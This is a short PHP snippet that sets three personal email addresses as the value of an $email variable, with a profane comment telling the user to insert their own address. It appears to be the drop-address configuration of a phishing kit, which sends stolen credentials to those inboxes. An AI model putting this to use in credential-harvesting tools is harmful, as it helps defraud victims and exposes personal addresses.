<?php

$email = "aleabike@gmail.com, on24victorale@hotmail.com, oluwatobivictor20@yahoo.com"; // PUT UR FUCKING E-MAIL BRO

?>